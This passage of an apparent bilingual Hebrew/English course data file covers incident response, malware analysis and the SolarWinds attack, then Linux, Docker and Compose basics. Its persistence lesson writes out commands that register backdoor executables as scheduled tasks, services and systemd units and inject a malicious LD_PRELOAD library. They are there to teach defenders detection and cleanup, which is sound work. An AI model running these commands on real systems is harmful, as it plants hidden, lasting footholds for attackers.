netstat -tulnp                  # פורטים פתוחים + תהליכים
ss -tulnp                       # modern netstat
ps auxf                         # עץ תהליכים
last -n 20                      # 20 logins אחרונים
cat /etc/crontab                # persistence ב-cron
find /tmp -newer /etc/passwd    # קבצים חדשים ב-/tmp

# Windows PowerShell
Get-Process | Sort CPU -Desc    # תהליכים לפי CPU
Get-NetTCPConnection            # חיבורים פעילים
Get-ScheduledTask | Where-Object State -eq 'Ready'  # scheduled tasks</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "אירוע אמיתי — SolarWinds 2020",
        content: `<div dir="rtl">
<p><strong><code>SolarWinds</code> — <code>Supply Chain Attack</code></strong></p>
<p>דצמבר 2020: חברת <code>FireEye</code> גילתה שתוקפים מקבוצת <code>APT29</code> (Cozy Bear) חדרו לתוכנת ניהול ה-IT <code>Orion</code> של <code>SolarWinds</code>.</p>
<p>העדכון הרגיל של התוכנה הפך לנשק סייבר.</p>
<p><strong>שרשרת ההתקפה</strong></p>
<ol>
<li>תוקפים חדרו לסביבת הפיתוח של <code>SolarWinds</code> (<code>SUNBURST</code>)</li>
<li>הזריקו <code>backdoor</code> ל-<code>Orion DLL</code> — <code>SUNBURST malware</code></li>
<li><code>SolarWinds</code> שחררה <code>update</code> חתומה — 18,000 לקוחות התקינו</li>
<li><code>SUNBURST</code> "ישן" 2 שבועות לפני הפעלה — נמנע מ-<code>sandbox detection</code></li>
<li><code>C2</code> תקשורת דרך <code>DNS</code> — נראתה כ-<code>legitimate traffic</code></li>
<li>לקוחות כולל <code>FireEye</code>, <code>Microsoft</code>, <code>US Treasury</code>, <code>DoD</code> — נפגעו</li>
</ol>
<p><strong>לקחים</strong></p>
<ul>
<li><strong><code>Software Supply Chain</code></strong> — ה-<code>update</code> הרגיל הוא וקטור תקיפה</li>
<li><strong><code>Code Signing</code></strong> — חתימה לא מספיקה אם <code>CI/CD</code> נפרץ</li>
<li><strong><code>Zero Trust</code></strong> — גם <code>software</code> "מאמין" צריך לפעול עם <code>minimal privilege</code></li>
<li><strong><code>Network segmentation</code></strong> — היתה אמורה למנוע תנועה <code>laterally</code></li>
<li>גורם ייחוס: ממשלת ארה"ב — רוסיה (SVR)</li>
</ul>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Incident Response",
        titleEn: "Incident Response — Comprehension Questions",
        questions: [
          { q: "מה 6 שלבי Incident Response?", a: "ששת השלבים: הכנה, זיהוי, בלימה, מיגור, שחזור, והפקת לקחים. שלב הבלימה (Containment) קריטי לצמצום נזק מיידי, ושלב הפקת הלקחים (Lessons Learned) מונע הישנות.", qEn: "What are the 6 stages of Incident Response?", aEn: "The six stages are: Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned. Containment is critical for reducing immediate damage. Lessons Learned prevents it from happening again." },
          { q: "מה Supply Chain Attack? תן דוגמה.", a: "תקיפת שרשרת אספקה — פריצה לתוכנה של ספק שאתה סומך עליה. בדוגמת SolarWinds: תוקפים הזריקו נוזקה לעדכון חתום של מוצר Orion, ו-18,000 ארגונים התקינו אותו מרצון.", qEn: "What is a Supply Chain Attack? Give an example.", aEn: "A supply chain attack means breaking into software from a vendor you trust. In the SolarWinds example: attackers injected malware into a signed update of the Orion product, and 18,000 organizations installed it willingly." },
          { q: "מה volatility ולמה משתמשים בו ב-IR?", a: "Volatility הוא כלי לניתוח תמונות זיכרון (memory dumps). בתגובה לאירוע משתמשים בו לזיהוי תהליכים זדוניים, חיבורי רשת בזמן הפריצה, והזרקת קוד לתהליכים — מידע שלא נשמר בדיסק.", qEn: "What is Volatility and why is it used in IR?", aEn: "Volatility is a tool for analyzing memory dumps. During incident response, it is used to find malicious processes, network connections at the time of the breach, and code injection into processes — information that is not saved on disk." }
        ]
      }
    ]
  },
  {
    id: 115,
    title: "Malware Analysis — מבוא",
    pages: [
      {
        type: "explanation",
        title: "סוגי Malware",
        content: `<div dir="rtl">
<p><strong><code>Malware</code> — סוגים ומאפיינים</strong></p>
<table class="content-table">
  <tr><th>סוג</th><th>תיאור</th><th>דוגמה מפורסמת</th></tr>
  <tr><td><strong><code>Virus</code></strong></td><td>מדביק קבצים, מתפשט בעצמו</td><td><code>CIH</code>, <code>Melissa</code></td></tr>
  <tr><td><strong><code>Worm</code></strong></td><td>מתפשט ברשת ללא קובץ <code>host</code></td><td><code>WannaCry</code>, <code>Slammer</code></td></tr>
  <tr><td><strong><code>Trojan</code></strong></td><td>מסווה עצמו כ-<code>software</code> לגיטימי</td><td><code>Emotet</code>, <code>ZeuS</code></td></tr>
  <tr><td><strong><code>Ransomware</code></strong></td><td>מצפין קבצים, דורש כופר</td><td><code>LockBit</code>, <code>REvil</code></td></tr>
  <tr><td><strong><code>Rootkit</code></strong></td><td>מסתיר עצמו ב-<code>OS kernel</code></td><td><code>TDSS</code>, <code>Necurs</code></td></tr>
  <tr><td><strong><code>Spyware</code></strong></td><td>גנב מידע שקט</td><td><code>Pegasus</code>, <code>FinFisher</code></td></tr>
  <tr><td><strong><code>RAT</code></strong></td><td><code>Remote Access Trojan</code> — שליטה מלאה</td><td><code>Cobalt Strike</code>, <code>NjRAT</code></td></tr>
  <tr><td><strong><code>Botnet</code></strong></td><td>רשת מכשירים נגועים</td><td><code>Mirai</code>, <code>Conficker</code></td></tr>
</table>
<p><strong><code>Static</code> vs <code>Dynamic Analysis</code></strong></p>
<table class="content-table">
  <tr><th>שיטה</th><th>מה בודקים</th><th>כלים</th></tr>
  <tr><td><strong><code>Static</code></strong></td><td>הקובץ עצמו — <code>strings</code>, <code>imports</code>, <code>headers</code></td><td><code>Ghidra</code>, <code>IDA Pro</code>, <code>strings</code>, <code>PEStudio</code></td></tr>
  <tr><td><strong><code>Dynamic</code></strong></td><td>התנהגות בזמן ריצה — <code>API calls</code>, <code>network</code></td><td><code>Cuckoo Sandbox</code>, <code>Process Monitor</code></td></tr>
</table>
<div class="code-preview"><pre><code># Static Analysis — Linux
file malware.exe                    # סוג הקובץ
strings malware.exe | head -50      # strings קריאים
md5sum malware.exe                  # hash לבדיקה ב-VirusTotal
objdump -d malware.exe | head -100  # disassembly

# Dynamic Analysis (ב-isolated VM!)
# Process Monitor — מעקב אחרי filesystem/registry changes
# Wireshark — לכוד traffic C2
# API Monitor — ראה API calls כמו CreateFile, RegSetValue

# VirusTotal — בדיקה אונליין
# curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' \
#  -F 'apikey=<key>' -F 'file=@malware.exe'</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "Persistence Mechanisms",
        content: `<div dir="rtl">
<p><strong><code>Persistence</code> — איך <code>Malware</code> שורד <code>Reboot</code></strong></p>
<p>נוזקה מחפשת דרך להמשיך לפעול גם אחרי <code>reboot</code>.</p>
<p>הכרת מנגנוני <code>Persistence</code> חיונית לאנשי <code>IR</code> — הן לאיתור הנוזקה והן לניקוי מלא.</p>
<p><strong><code>Windows Persistence</code></strong></p>
<div class="code-preview"><pre><code># Registry Run Keys (הנפוצות ביותר)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# Malware מוסיף value → רץ עם כל login

# Scheduled Tasks
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon

# Services
sc create "WinHelper" binpath= "C:\malware.exe" start= auto

# DLL Hijacking
# תהליך לגיטימי טוען DLL מנתיב ניתן לכתיבה → malware DLL שם

# Startup Folder
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code></pre></div>
<p><strong><code>Linux Persistence</code></strong></p>
<div class="code-preview"><pre><code># Cron jobs
crontab -l              # של המשתמש הנוכחי
cat /etc/crontab        # System-wide
ls /etc/cron.d/         # Drop-in cron files

# Systemd service
cat /etc/systemd/system/backdoor.service
# [Service]
# ExecStart=/tmp/.hidden/backdoor
# Restart=always

# SSH Authorized Keys
cat ~/.ssh/authorized_keys  # Public keys שיכולות להתחבר ללא סיסמה

# LD_PRELOAD Hijacking
echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment</code></pre></div>
<p>כשמנקים נוזקה, חייבים לבדוק את כל מנגנוני ה-<code>Persistence</code> — אחרת היא חוזרת אחרי <code>reboot</code>.</p>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Malware Analysis",
        titleEn: "Malware Analysis — Comprehension Questions",
        questions: [
          { q: "מה ההבדל בין Static ל-Dynamic Analysis?", a: "ניתוח סטטי בוחן את הקובץ עצמו ללא הרצה — מחרוזות, ייבואים, קוד. ניתוח דינמי מריץ את הקובץ בסביבה מבודדת (sandbox) ובוחן התנהגות — קריאות מערכת, תעבורת רשת, שינויי קבצים. ניתוח דינמי מגלה קוד מוסווה (obfuscated) שניתוח סטטי מחמיץ.", qEn: "What is the difference between Static and Dynamic Analysis?", aEn: "Static analysis examines the file itself without running it — strings, imports, code. Dynamic analysis runs the file in an isolated environment (sandbox) and observes behavior — system calls, network traffic, file changes. Dynamic analysis reveals obfuscated code that static analysis misses." },
          { q: "מה Persistence ולמה זה חשוב ל-IR?", a: "התמדה (Persistence) היא מנגנון שמאפשר לנוזקה לרוץ שוב אחרי אתחול מחדש. בתגובה לאירוע חובה לנקות את כל מנגנוני ההתמדה — מפתחות רישום, משימות מתוזמנות, שירותים, משימות Cron — לפני שחזור המערכת.", qEn: "What is Persistence and why is it important for IR?", aEn: "Persistence is a mechanism that lets malware run again after a reboot. During incident response, you must clean all persistence mechanisms — registry keys, scheduled tasks, services, cron jobs — before restoring the system." },
          { q: "מה Ransomware וכיצד ניתן למנוע אותו?", a: "תוכנת כופר (Ransomware) מצפינה קבצים ודורשת תשלום לפענוח. מניעה: 1) גיבויים מנותקים מהרשת, 2) עדכוני אבטחה שוטפים, 3) סינון דואר אלקטרוני, 4) הגנת נקודות קצה, 5) פילוח רשת למניעת תנועה רוחבית של התוקף.", qEn: "What is Ransomware and how can you prevent it?", aEn: "Ransomware encrypts files and demands payment for decryption. Prevention: 1) offline backups, 2) regular security updates, 3) email filtering, 4) endpoint protection, 5) network segmentation to prevent lateral movement by the attacker." }
        ]
      }
    ]
  }
  ]
  },
  {
    id: 'devops',
    title: 'DevOps & Cloud',
    subtitle: 'Linux, Docker, Kubernetes, AWS — תשתיות מודרניות',
    icon: '☁️',
    color: '#22c55e',
    level: 'בינוני–מתקדם',
    chapters: [
  {
    id: 201,
    title: "ניהול Linux",
    pages: [
      {
        type: "explanation",
        title: "היררכיית מערכת הקבצים",
        content: `<div dir="rtl">
<h2><code>Filesystem Hierarchy Standard</code> — <code>FHS</code></h2>
<p><strong><code>FHS</code></strong> — <code>Filesystem Hierarchy Standard</code></p>
<p>תקן שמגדיר את מבנה עץ הקבצים של <code>Linux</code>.</p>
<p>העץ כולו מתחיל בשורש אחד — <code>/</code>.</p>
<p>כל רכיב במערכת — דיסקים, מכשירים, תהליכים — מיוצג כקובץ.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
  <text x="175" y="18" text-anchor="middle" font-size="13" fill="#e2e8f0" font-weight="bold">/</text>
  <line x1="175" y1="22" x2="40" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="105" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="175" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="245" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="315" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <rect x="10" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="39" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/bin</text>
  <rect x="76" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="105" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/etc</text>
  <rect x="146" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="175" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/home</text>
  <rect x="216" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="245" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/var</text>
  <rect x="286" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="315" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/proc</text>
  <line x1="39" y1="67" x2="39" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="10" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="39" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">קבצים הרצה</text>
  <line x1="105" y1="67" x2="105" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="76" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="105" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">הגדרות מערכת</text>
  <line x1="175" y1="67" x2="175" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="146" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="175" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">משתמשים</text>
  <line x1="245" y1="67" x2="245" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="216" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="245" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">לוגים/נתונים</text>
  <line x1="315" y1="67" x2="315" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="286" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="315" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">תהליכים חיים</text>
</svg>
</div>
<table class="content-table">
  <tr><th>נתיב</th><th>תוכן</th></tr>
  <tr><td><code>/bin</code>, <code>/usr/bin</code></td><td>קבצי הרצה של המערכת והמשתמשים</td></tr>
  <tr><td><code>/etc</code></td><td>קובצי הגדרות של כל השירותים</td></tr>
  <tr><td><code>/var/log</code></td><td>לוגים של המערכת והאפליקציות</td></tr>
  <tr><td><code>/proc</code>, <code>/sys</code></td><td>ממשק וירטואלי לגרעין <code>Linux</code></td></tr>
  <tr><td><code>/tmp</code></td><td>קבצים זמניים — נמחקים ברסטרט</td></tr>
  <tr><td><code>/home/user</code></td><td>תיקיית הבית של כל משתמש</td></tr>
</table>
<p><strong>טיפ</strong></p>
<p><code>/proc/cpuinfo</code> אינו קובץ אמיתי.</p>
<p>הגרעין יוצר אותו בזמן אמת בכל פעם שקוראים אותו.</p>
</div>`
      },
      {
        type: "explanation",
        title: "פקודות חיוניות — ניפוי בעיות",
        content: `<div dir="rtl">
<h2>ארגז הכלים של ה-<code>SysAdmin</code></h2>
<p><strong>5 הפקודות הראשונות לניפוי בעיות</strong></p>
<p>כשמשהו משתבש בפרודקשן, אלו הפקודות שתפעיל ראשונות:</p>
<table class="content-table">
  <tr><th>פקודה</th><th>מה היא עושה</th></tr>
  <tr><td><code>ls -lah</code></td><td>רשימת קבצים עם הרשאות, גדלים ותאריכים</td></tr>
  <tr><td><code>grep -r "error" /var/log/</code></td><td>חיפוש רקורסיבי בטקסט — מוצא שגיאות בלוגים</td></tr>
  <tr><td><code>ps aux</code></td><td>כל התהליכים הרצים — <code>CPU</code>, <code>memory</code>, <code>PID</code></td></tr>
  <tr><td><code>ss -tulnp</code></td><td>פורטים פתוחים ואיזה תהליך מאזין לכל אחד</td></tr>
  <tr><td><code>journalctl -u nginx -f</code></td><td>לוגים בזמן אמת לשירות ספציפי</td></tr>
</table>
<div class="code-preview"><pre><code># מי מאזין על פורט 80?
ss -tulnp | grep :80

# 50 שורות לוג אחרונות של שירות
journalctl -u myapp --no-pager -n 50

# תהליכים הכי כבדים על CPU
ps aux --sort=-%cpu | head -10

# חיפוש קובץ שמכיל "password" (זהירות!)
grep -r --include="*.conf" "password" /etc/

# שימוש בדיסק לכל תיקייה
du -sh /var/log/* | sort -rh | head -10</code></pre></div>
<p><strong>זרימת עבודה מומלצת לניפוי בעיות</strong></p>
<ol>
  <li>בדוק לוגים: <code>journalctl -xe</code></li>
  <li>בדוק תהליכים: <code>ps aux | grep appname</code></li>
  <li>בדוק פורטים: <code>ss -tulnp | grep PORT</code></li>
  <li>בדוק דיסק: <code>df -h</code> ו-<code>du -sh *</code></li>
  <li>בדוק RAM: <code>free -h</code></li>
</ol>
</div>`
      },
      {
        type: "explanation",
        title: "הרשאות — chmod, chown",
        content: `<div dir="rtl">
<h2>מודל ההרשאות של <code>Linux</code></h2>
<p>כל קובץ שייך ל<strong>משתמש</strong> ול<strong>קבוצה</strong>.</p>
<p>לכל קובץ יש 3 סטי הרשאות:</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
  <rect x="10" y="15" width="340" height="40" rx="6" fill="#1e293b"/>
  <text x="20" y="40" font-size="16" fill="#f1f5f9" font-family="monospace">-  rwx  r-x  r--</text>
  <text x="22" y="58" font-size="9" fill="#94a3b8">סוג</text>
  <text x="50" y="58" font-size="9" fill="#86efac">בעלים</text>
  <text x="100" y="58" font-size="9" fill="#fbbf24">קבוצה</text>
  <text x="148" y="58" font-size="9" fill="#f87171">אחרים</text>
  <rect x="10" y="72" width="100" height="38" rx="5" fill="#14532d"/>
  <text x="60" y="87" text-anchor="middle" font-size="10" fill="#86efac" font-weight="bold">rwx = 7</text>
  <text x="60" y="103" text-anchor="middle" font-size="9" fill="#86efac">r=4, w=2, x=1</text>
  <rect x="120" y="72" width="100" height="38" rx="5" fill="#78350f"/>
  <text x="170" y="87" text-anchor="middle" font-size="10" fill="#fbbf24" font-weight="bold">r-x = 5</text>
  <text x="170" y="103" text-anchor="middle" font-size="9" fill="#fbbf24">קרא + הרץ</text>
  <rect x="230" y="72" width="120" height="38" rx="5" fill="#450a0a"/>
  <text x="290" y="87" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">r-- = 4</text>
  <text x="290" y="103" text-anchor="middle" font-size="9" fill="#f87171">קרא בלבד</text>
</svg>
</div>
<div class="code-preview"><pre><code># הצג הרשאות
ls -la /var/www/html/

# chmod — שנה הרשאות (מספרי)
chmod 755 script.sh     # rwxr-xr-x
chmod 644 config.conf   # rw-r--r--
chmod 600 private.key   # rw------- (מפתח SSH!)

# chmod — symbolic
chmod +x deploy.sh      # הוסף הרצה לכולם
chmod u+w,g-w file.txt  # בעלים: הוסף כתיבה, קבוצה: הסר

# chown — שנה בעלות
chown www-data:www-data /var/www/html/
chown -R ubuntu:ubuntu /home/ubuntu/app/

# הרשאות מיוחדות — SUID, SGID, Sticky
chmod +t /tmp           # Sticky bit — רק בעלים מוחק
chmod u+s /usr/bin/sudo # SUID — רץ כבעלים</code></pre></div>
<p><strong>כלל אצבע</strong></p>
<ul>
<li>קבצי הגדרה עם סיסמאות — <code>600</code> תמיד</li>
<li>ספריות אינטרנט — <code>755</code></li>
<li>קבצי scripts — <code>755</code></li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "systemd — ניהול שירותים",
        content: `<div dir="rtl">
<h2><code>systemd</code> — <code>init</code> מערכת מודרני</h2>
<p><strong><code>systemd</code></strong> — התהליך הראשון שרץ ב-<code>Linux</code> — <code>PID 1</code></p>
<p>מנהל את כל השירותים, ה-<code>mount points</code> וה-<code>timers</code>.</p>
<table class="content-table">
  <tr><th>פקודה</th><th>פעולה</th></tr>
  <tr><td><code>systemctl status nginx</code></td><td>מצב שירות — רץ/עצר/שגיאה</td></tr>
  <tr><td><code>systemctl start/stop/restart nginx</code></td><td>שלוט בשירות</td></tr>
  <tr><td><code>systemctl enable nginx</code></td><td>הפעל אוטומטית בבוט</td></tr>
  <tr><td><code>systemctl disable nginx</code></td><td>הסר הפעלה אוטומטית</td></tr>
  <tr><td><code>systemctl list-units --failed</code></td><td>כל השירותים שנכשלו</td></tr>
  <tr><td><code>journalctl -u nginx -since "1h ago"</code></td><td>לוגים של שעה אחרונה</td></tr>
</table>
<div class="code-preview"><pre><code># קובץ unit מותאם אישית
# /etc/systemd/system/myapp.service
[Unit]
Description=My Python App
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/app
ExecStart=/home/ubuntu/app/venv/bin/python -m uvicorn main:app
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target

# הפעלה
sudo systemctl daemon-reload
sudo systemctl enable myapp
sudo systemctl start myapp</code></pre></div>
<p><strong>יתרון גדול של <code>systemd</code></strong></p>
<p><code>Restart=on-failure</code> — השירות יקום אוטומטית אחרי קריסה.</p>
<p>אין צורך ב-<code>cron</code> או <code>supervisor</code> חיצוני.</p>
</div>`
      }
    ]
  },
  {
    id: 202,
    title: "Docker — קונטיינריזציה",
    pages: [
      {
        type: "explanation",
        title: "VM לעומת קונטיינר",
        content: `<div dir="rtl">
<h2>המהפכה של הקונטיינרים</h2>
<p><strong><code>VM</code></strong> — <code>Virtual Machine</code></p>
<p>לפני <code>Docker</code>, כל אפליקציה הצריכה <code>VM</code> שלמה — גרעין, <code>OS</code> מלא, <code>RAM</code> נפרד.</p>
<p>הבזבוז היה עצום.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
  <rect x="5" y="5" width="165" height="110" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="87" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Virtual Machines</text>
  <rect x="12" y="25" width="70" height="55" rx="4" fill="#0f2744"/>
  <text x="47" y="40" text-anchor="middle" font-size="8" fill="#7dd3fc">App A</text>
  <rect x="15" y="43" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="47" y="53" text-anchor="middle" font-size="7" fill="#93c5fd">Guest OS</text>
  <rect x="15" y="58" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="47" y="68" text-anchor="middle" font-size="7" fill="#93c5fd">Hypervisor</text>
  <rect x="90" y="25" width="70" height="55" rx="4" fill="#0f2744"/>
  <text x="125" y="40" text-anchor="middle" font-size="8" fill="#7dd3fc">App B</text>
  <rect x="93" y="43" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="125" y="53" text-anchor="middle" font-size="7" fill="#93c5fd">Guest OS</text>
  <rect x="93" y="58" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="125" y="68" text-anchor="middle" font-size="7" fill="#93c5fd">Hypervisor</text>
  <rect x="12" y="83" width="148" height="25" rx="3" fill="#0c1a2e"/>
  <text x="86" y="99" text-anchor="middle" font-size="8" fill="#60a5fa">Hardware</text>

  <rect x="188" y="5" width="167" height="110" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="271" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Containers</text>
  <rect x="195" y="25" width="68" height="30" rx="4" fill="#14532d"/>
  <text x="229" y="44" text-anchor="middle" font-size="8" fill="#86efac">Container A</text>
  <rect x="271" y="25" width="68" height="30" rx="4" fill="#14532d"/>
  <text x="305" y="44" text-anchor="middle" font-size="8" fill="#86efac">Container B</text>
  <rect x="195" y="60" width="144" height="15" rx="3" fill="#1e3a5f"/>
  <text x="267" y="71" text-anchor="middle" font-size="7" fill="#93c5fd">Docker Engine (משתף גרעין)</text>
  <rect x="195" y="78" width="144" height="30" rx="3" fill="#0c1a2e"/>
  <text x="267" y="97" text-anchor="middle" font-size="8" fill="#60a5fa">Host OS + Hardware</text>
</svg>
</div>
<table class="content-table">
  <tr><th>מאפיין</th><th><code>VM</code></th><th><code>Container</code></th></tr>
  <tr><td>גודל</td><td><code>GBs</code></td><td><code>MBs</code></td></tr>
  <tr><td>זמן הפעלה</td><td>דקות</td><td>שניות / מילישניות</td></tr>
  <tr><td>גרעין</td><td>נפרד לכל <code>VM</code></td><td>משותף עם <code>Host</code></td></tr>
  <tr><td>בידוד</td><td>חזק מאוד</td><td>חזק (namespaces)</td></tr>
  <tr><td>ביצועים</td><td>תקורה גבוהה</td><td>כמעט כמו <code>native</code></td></tr>
</table>
<p><strong><code>Docker</code></strong> — משתמש בשני מנגנונים של <code>Linux kernel</code>:</p>
<ul>
<li><strong><code>namespaces</code></strong> — בידוד בין <code>containers</code></li>
<li><strong><code>cgroups</code></strong> — הגבלת משאבים כמו <code>CPU</code> ו-<code>RAM</code></li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Dockerfile — בניית image",
        content: `<div dir="rtl">
<h2><code>Dockerfile</code> — הוראות הבנייה</h2>
<p><strong><code>Dockerfile</code></strong></p>
<p>קובץ טקסט שמגדיר שכבה-אחר-שכבה איך לבנות <code>image</code>.</p>
<p>כל פקודה יוצרת שכבה חדשה ב-<code>filesystem</code>.</p>
<div class="code-preview"><pre><code># Dockerfile לאפליקציית Python/FastAPI
FROM python:3.12-slim

# מגדיר תיקיית עבודה בתוך הקונטיינר
WORKDIR /app

# מעתיק requirements תחילה (cache optimization!)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# מעתיק שאר הקוד
COPY . .

# פורט שהאפליקציה מאזינה עליו (תיעוד בלבד)
EXPOSE 8000

# משתנה סביבה
ENV PYTHONUNBUFFERED=1

# הפקודה שתרוץ בהפעלת הקונטיינר
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]</code></pre></div>
<table class="content-table">
  <tr><th>פקודה</th><th>תפקיד</th></tr>
  <tr><td><code>FROM</code></td><td><code>image</code> בסיס — מריץ מ-<code>Docker Hub</code></td></tr>
  <tr><td><code>RUN</code></td><td>מריץ פקודת <code>shell</code> בזמן בנייה — יוצר שכבה חדשה</td></tr>
  <tr><td><code>COPY</code></td><td>מעתיק קבצים מה-<code>host</code> לתוך <code>image</code></td></tr>
  <tr><td><code>ENV</code></td><td>משתנה סביבה שנשאר ב-<code>image</code></td></tr>
  <tr><td><code>CMD</code></td><td>פקודה ברירת מחדל להרצה — ניתן לעקוף</td></tr>
  <tr><td><code>ENTRYPOINT</code></td><td>פקודה קבועה — לא ניתן לעקוף</td></tr>
</table>
<div class="code-preview"><pre><code># בנייה והרצה
docker build -t myapp:latest .
docker run -d -p 8000:8000 --name myapp myapp:latest

# בדיקה
docker logs myapp -f
docker exec -it myapp bash</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "Docker Compose — multi-container",
        content: `<div dir="rtl">
<h2><code>Docker Compose</code> — כמה שירותים יחד</h2>
<p><strong><code>Docker Compose</code></strong></p>
<p>בפרויקטים אמיתיים יש <code>backend</code> + <code>database</code> + <code>cache</code> + <code>nginx</code>.</p>
<p><code>Compose</code> מאפשר להגדיר את כל השירותים בקובץ <code>YAML</code> אחד.</p>
<div class="code-preview"><pre><code># docker-compose.yml
version: '3.8'

services:
  web:
    build: .
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://user:pass@db:5432/mydb
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    volumes:
      - ./data:/app/data

  db:
    image: postgres:16
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: mydb
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - web

volumes:
  postgres_data:</code></pre></div>
<div class="code-preview"><pre><code># פקודות Compose
docker compose up -d          # הפעל הכל ברקע
docker compose down           # עצור והרס קונטיינרים
docker compose logs web -f    # לוגים של שירות
docker compose ps             # סטטוס
docker compose exec db psql -U user mydb  # כנס ל-DB</code></pre></div>
<p><strong>חשוב</strong></p>
<p>שמות ה-<code>services</code> הם גם ה-<code>DNS hostnames</code> ברשת הפנימית.</p>
<p><strong>דוגמה</strong></p>
<p>השירות <code>web</code> מגיע ל-<code>db</code> פשוט בשם <code>db</code> — ללא כתובת <code>IP</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Docker Networking",
        content: `<div dir="rtl">
<h2>רשתות <code>Docker</code> — <code>Bridge</code>, <code>Host</code>, <code>Overlay</code></h2>
<p><strong>רשתות <code>Docker</code></strong></p>
<p><code>Docker</code> יוצר רשתות וירטואליות שמאפשרות תקשורת בין <code>containers</code>.</p>
<p>הרשתות מבודדות לחלוטין מהעולם החיצוני.</p>
<table class="content-table">
  <tr><th>סוג רשת</th><th>שימוש</th><th>IP</th></tr>
  <tr><td><strong><code>bridge</code></strong></td><td>ברירת מחדל — קונטיינרים על אותו <code>host</code></td><td>172.17.0.x</td></tr>
  <tr><td><strong><code>host</code></strong></td><td>קונטיינר משתמש ב-<code>network</code> של ה-<code>host</code> ישירות</td><td>כמו <code>host</code></td></tr>
  <tr><td><strong><code>none</code></strong></td><td>בידוד מלא — אין רשת</td><td>—</td></tr>
  <tr><td><strong><code>overlay</code></strong></td><td><code>Swarm</code> / <code>K8s</code> — תקשורת בין <code>hosts</code> שונים</td><td>10.0.x.x</td></tr>
</table>
<div class="code-preview"><pre><code># רשת מותאמת אישית — מומלץ תמיד!
docker network create mynet

docker run -d --name backend --network mynet myapp
docker run -d --name db --network mynet postgres:16

# backend יכול ל-ping db לפי שם:
docker exec backend ping db  # עובד!

# פתיחת פורט לעולם החיצוני
docker run -p 8080:8000 myapp
# host:8080 → container:8000

# הצג כל הרשתות
docker network ls
docker network inspect mynet

# Overlay ב-Docker Swarm
docker network create --driver overlay --attachable prod-net</code></pre></div>
<p><strong>כלל</strong></p>
<p>תמיד צרו <code>user-defined bridge network</code> — לא ב-<code>default bridge</code>.</p>
<p>כך מתאפשר <code>DNS resolution</code> לפי שם ה-<code>container</code>.</p>
</div>`
      }
    ]
  },
  {
    id: 203,
    title: "Kubernetes — אורקסטרציה",
    pages: [
      {
        type: "explanation",
